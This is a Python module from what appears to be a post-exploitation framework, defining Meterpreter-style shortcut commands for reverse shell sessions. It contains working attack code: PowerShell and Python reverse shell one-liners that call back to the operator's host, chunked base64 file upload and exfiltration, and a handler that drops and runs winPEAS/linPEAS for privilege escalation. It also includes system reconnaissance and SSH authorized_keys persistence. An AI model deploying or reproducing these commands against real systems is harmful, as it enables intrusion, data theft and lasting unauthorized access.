"""
Shortcut Registry - Extensible command shortcuts for reverse shell sessions.
Inspired by Meterpreter commands, designed to be easily expandable.
"""

import base64
import os
import threading
import time

from .handler import ReverseShellManager


class ShortcutRegistry:
    """
    Registry of shortcut commands that can be executed on active sessions.
    Each shortcut has a name, description, icon, and handler function.
    Designed to be extensible - add new shortcuts via register().
    """
    
    _shortcuts: dict[str, dict] = {}
    
    @classmethod
    def register(cls, shortcut_id: str, name: str, description: str, 
                 icon: str = "terminal", category: str = "general",
                 params: list = None, handler=None):
        """Register a new shortcut command."""
        cls._shortcuts[shortcut_id] = {
            'id': shortcut_id,
            'name': name,
            'description': description,
            'icon': icon,
            'category': category,
            'params': params or [],
            'handler': handler
        }
    
    @classmethod
    def get_all(cls) -> list:
        """Get all registered shortcuts (without handler functions)."""
        return [{
            'id': s['id'],
            'name': s['name'],
            'description': s['description'],
            'icon': s['icon'],
            'category': s['category'],
            'params': s['params']
        } for s in cls._shortcuts.values()]
    
    @classmethod
    def execute(cls, shortcut_id: str, session_id: str, params: dict = None) -> dict:
        """Execute a shortcut on a specific session."""
        shortcut = cls._shortcuts.get(shortcut_id)
        if not shortcut:
            return {'success': False, 'error': f'Unknown shortcut: {shortcut_id}'}
        
        manager = ReverseShellManager()
        session = manager.get_session(session_id)
        if not session or not session.active:
            return {'success': False, 'error': 'Session not found or inactive'}
        
        handler = shortcut.get('handler')
        if not handler:
            return {'success': False, 'error': f'Shortcut {shortcut_id} has no handler'}
        
        try:
            return handler(session, params or {}, manager)
        except Exception as e:
            return {'success': False, 'error': str(e)}


# ─── Shortcut Handlers ───────────────────────────────────────────

def _handle_upload(session, params: dict, manager: ReverseShellManager) -> dict:
    """Upload a file to the target via base64 encoding."""
    file_content = params.get('content', '')
    dest_path = params.get('path', '')
    
    if not file_content or not dest_path:
        return {'success': False, 'error': 'Missing file content or destination path'}
    
    # Decode base64 content
    try:
        raw_bytes = base64.b64decode(file_content)
    except Exception:
        return {'success': False, 'error': 'Invalid base64 content'}
    
    # Choose encoding method based on OS
    if session.os_type == 'windows':
        # PowerShell base64 upload
        b64_content = base64.b64encode(raw_bytes).decode()
        cmd = f'powershell -Command "[System.Convert]::FromBase64String(\'{b64_content}\') | Set-Content -Path \'{dest_path}\' -Encoding Byte"'
    else:
        # Linux base64 upload
        b64_content = base64.b64encode(raw_bytes).decode()
        # Split into chunks to avoid command line length limits
        chunk_size = 4000
        chunks = [b64_content[i:i+chunk_size] for i in range(0, len(b64_content), chunk_size)]
        
        if len(chunks) == 1:
            cmd = f'echo {b64_content} | base64 -d > {dest_path}'
        else:
            # Multi-chunk upload
            cmds = [f'echo "{chunks[0]}" > /tmp/__upload.b64']
            for chunk in chunks[1:]:
                cmds.append(f'echo "{chunk}" >> /tmp/__upload.b64')
            cmds.append(f'base64 -d /tmp/__upload.b64 > {dest_path}')
            cmds.append(f'rm -f /tmp/__upload.b64')
            cmd = ' && '.join(cmds)
    
    session.send_command(cmd)
    return {'success': True, 'message': f'Uploading file to {dest_path}...'}


def _handle_download(session, params: dict, manager: ReverseShellManager) -> dict:
    """Download a file from the target via base64 encoding."""
    src_path = params.get('path', '')
    if not src_path:
        return {'success': False, 'error': 'Missing source path'}
    
    if session.os_type == 'windows':
        cmd = f'powershell -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'{src_path}\'))"'
    else:
        cmd = f'base64 -w0 {src_path} 2>/dev/null || base64 {src_path}'
    
    session.send_command(cmd)
    return {
        'success': True, 
        'message': f'Downloading {src_path}... Output will appear in terminal. Copy the base64 and decode locally.',
        'download_mode': True,
        'path': src_path
    }


def _handle_privesc_enum(session, params: dict, manager: ReverseShellManager) -> dict:
    """Run privilege escalation enumeration (winpeas/linpeas)."""
    peas_dir = os.path.join(os.path.dirname(__file__), 'peas')
    
    if session.os_type == 'windows':
        peas_path = os.path.join(peas_dir, 'winpeas.exe')
        if not os.path.exists(peas_path):
            return {
                'success': False, 
                'error': 'winpeas.exe not found in classes/reverse_shell/peas/. '
                         'Download from https://github.com/peass-ng/PEASS-ng/releases'
            }
        
        # Read and upload winpeas
        with open(peas_path, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        
        # Upload in chunks
        chunk_size = 4000
        chunks = [content[i:i+chunk_size] for i in range(0, len(content), chunk_size)]
        
        cmds = ['powershell -Command "']
        cmds.append(f'$b64 = \'{chunks[0]}\'')
        for chunk in chunks[1:]:
            cmds.append(f'$b64 += \'{chunk}\'')
        cmds.append('[System.Convert]::FromBase64String($b64) | Set-Content -Path \'$env:TEMP\\winpeas.exe\' -Encoding Byte')
        cmds.append('Start-Process -FilePath \'$env:TEMP\\winpeas.exe\' -NoNewWindow -Wait')
        cmds.append('Remove-Item -Path \'$env:TEMP\\winpeas.exe\' -Force')
        cmds.append('"')
        
        cmd = ' '.join(cmds)
    else:
        peas_path = os.path.join(peas_dir, 'linpeas.sh')
        if not os.path.exists(peas_path):
            return {
                'success': False, 
                'error': 'linpeas.sh not found in classes/reverse_shell/peas/. '
                         'Download from https://github.com/peass-ng/PEASS-ng/releases'
            }
        
        with open(peas_path, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        
        chunk_size = 4000
        chunks = [content[i:i+chunk_size] for i in range(0, len(content), chunk_size)]
        
        cmds = [f'echo "{chunks[0]}" > /tmp/__peas.b64']
        for chunk in chunks[1:]:
            cmds.append(f'echo "{chunk}" >> /tmp/__peas.b64')
        cmds.append('base64 -d /tmp/__peas.b64 > /tmp/linpeas.sh')
        cmds.append('chmod +x /tmp/linpeas.sh')
        cmds.append('/tmp/linpeas.sh')
        cmds.append('rm -f /tmp/__peas.b64 /tmp/linpeas.sh')
        
        cmd = ' && '.join(cmds)
    
    session.send_command(cmd)
    return {'success': True, 'message': f'Running {"winpeas" if session.os_type == "windows" else "linpeas"} on target... Output will stream to terminal.'}


def _handle_open_channel(session, params: dict, manager: ReverseShellManager) -> dict:
    """Open a parallel reverse shell channel on a new port."""
    new_port = params.get('port', 0)
    if not new_port or new_port < 1 or new_port > 65535:
        return {'success': False, 'error': 'Invalid port number'}
    
    # Start a new listener
    result = manager.start_listener(int(new_port))
    if not result['success']:
        return result
    
    local_ip = manager.get_local_ip()
    
    # Send command to spawn new reverse shell
    if session.os_type == 'windows':
        cmd = f'powershell -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{local_ip}\',{new_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+\'PS> \');$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"'
    else:
        cmd = f'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{local_ip}\',{new_port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\'/bin/sh\',\'-i\'])" &'
    
    session.send_command(cmd)
    return {
        'success': True, 
        'message': f'New channel opening on port {new_port}. Waiting for connection...',
        'new_port': new_port
    }


def _handle_sysinfo(session, params: dict, manager: ReverseShellManager) -> dict:
    """Gather system information."""
    if session.os_type == 'windows':
        cmd = 'systeminfo & whoami & ipconfig /all & net user'
    else:
        cmd = 'uname -a; whoami; id; cat /etc/os-release 2>/dev/null; ip addr 2>/dev/null || ifconfig'
    
    session.send_command(cmd)
    return {'success': True, 'message': 'Gathering system information...'}


def _handle_spawn_tty(session, params: dict, manager: ReverseShellManager) -> dict:
    """Spawn a proper TTY shell (Linux only)."""
    if session.os_type == 'windows':
        return {'success': False, 'error': 'TTY spawn only works on Linux targets'}
    
    cmd = 'python3 -c "import pty; pty.spawn(\'/bin/bash\')" 2>/dev/null || python -c "import pty; pty.spawn(\'/bin/bash\')" 2>/dev/null || script -qc /bin/bash /dev/null'
    session.send_command(cmd)
    return {'success': True, 'message': 'Spawning TTY shell...'}


def _handle_clear(session, params: dict, manager: ReverseShellManager) -> dict:
    """Clear the terminal output buffer."""
    with session.output_lock:
        session.output_buffer.clear()
    return {'success': True, 'message': 'Terminal cleared'}


def _handle_persistence_ssh(session, params: dict, manager: ReverseShellManager) -> dict:
    """Add SSH key to authorized_keys for persistence (Linux only)."""
    ssh_key = params.get('key', '')
    if not ssh_key:
        return {'success': False, 'error': 'No SSH public key provided'}
    
    cmd = f'mkdir -p ~/.ssh && echo "{ssh_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
    session.send_command(cmd)
    return {'success': True, 'message': 'Adding SSH key for persistence...'}


# ─── Register all default shortcuts ──────────────────────────────

def register_default_shortcuts():
    """Register all built-in shortcuts."""
    
    # File Operations
    ShortcutRegistry.register(
        'upload', 'Upload File', 'Upload a file from your machine to the target',
        icon='upload', category='file',
        params=[{'name': 'path', 'label': 'Destination Path', 'type': 'text', 'required': True},
                {'name': 'content', 'label': 'File', 'type': 'file', 'required': True}],
        handler=_handle_upload
    )
    
    ShortcutRegistry.register(
        'download', 'Download File', 'Download a file from the target (base64 output)',
        icon='download', category='file',
        params=[{'name': 'path', 'label': 'Remote File Path', 'type': 'text', 'required': True}],
        handler=_handle_download
    )
    
    # Privilege Escalation
    ShortcutRegistry.register(
        'privesc_enum', 'PrivEsc Enum', 'Auto-detect OS and run WinPEAS/LinPEAS',
        icon='shield', category='privesc',
        params=[],
        handler=_handle_privesc_enum
    )
    
    # Session Management
    ShortcutRegistry.register(
        'open_channel', 'Open Channel', 'Open a parallel reverse shell on a new port',
        icon='plus-circle', category='session',
        params=[{'name': 'port', 'label': 'New Port', 'type': 'number', 'required': True}],
        handler=_handle_open_channel
    )
    
    ShortcutRegistry.register(
        'spawn_tty', 'Spawn TTY', 'Upgrade to a fully interactive TTY shell (Linux)',
        icon='terminal', category='session',
        params=[],
        handler=_handle_spawn_tty
    )
    
    ShortcutRegistry.register(
        'clear', 'Clear Terminal', 'Clear the current terminal output',
        icon='trash', category='session',
        params=[],
        handler=_handle_clear
    )
    
    # Recon
    ShortcutRegistry.register(
        'sysinfo', 'System Info', 'Gather comprehensive system information',
        icon='info', category='recon',
        params=[],
        handler=_handle_sysinfo
    )
    
    # Persistence
    ShortcutRegistry.register(
        'persist_ssh', 'SSH Persistence', 'Add an SSH public key for persistent access (Linux)',
        icon='key', category='persistence',
        params=[{'name': 'key', 'label': 'SSH Public Key', 'type': 'textarea', 'required': True}],
        handler=_handle_persistence_ssh
    )
